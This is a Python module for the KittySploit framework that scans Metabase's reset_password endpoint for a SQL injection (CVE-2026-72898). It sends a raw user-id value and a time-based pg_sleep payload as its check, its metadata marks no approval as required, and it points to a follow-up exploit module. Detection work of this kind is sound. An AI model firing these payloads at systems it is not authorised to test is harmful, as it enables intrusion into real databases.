#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Metabase CVE-2026-72898 reset_password SQLi detection."""

from __future__ import annotations

import json
import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Metabase CVE-2026-72898 SQLi Detect",
        "description": (
            "Probes POST /api/session/reset_password for undeclared user-id {:raw} "
            "acceptance and optional pg_sleep timing oracle."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-72898"],
        "tags": ["web", "scanner", "metabase", "sqli", "cve-2026-72898"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-72898"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": ["exploits/multi/http/metabase_cve_2026_72898_sqli"],
            },
        },
    }

    sqli_delay = OptInt(3, "pg_sleep seconds for timing check", required=False, advanced=True)

    def _post(self, raw_sql: str) -> tuple[int, str, float]:
        payload = {"token": "x", "password": "x", "user-id": {"raw": raw_sql}}
        start = time.time()
        r = self.http_request(
            "POST",
            "/api/session/reset_password",
            data=json.dumps(payload),
            headers={"Content-Type": "application/json"},
        )
        elapsed = time.time() - start
        body = (r.text or "") if r else ""
        return int(r.status_code or 0) if r else 0, body, elapsed

    def run(self):
        _, body, base = self._post("1")
        if "disallowed key" in body.lower():
            return False
        delay = int(self.sqli_delay or 3)
        _, _, slow = self._post(f"(SELECT 1 FROM pg_sleep({delay}))")
        if slow > base + delay * 0.6:
            self.set_info(
                severity="critical",
                cve="CVE-2026-72898",
                reason="Time-based SQLi on reset_password",
                confidence="high",
            )
            return True
        if re.search(r"password|reset|user", body, re.I):
            self.set_info(
                severity="high",
                cve="CVE-2026-72898",
                reason="user-id raw key accepted (confirm with exploit; may be non-PostgreSQL)",
                confidence="medium",
            )
            return True
        return False
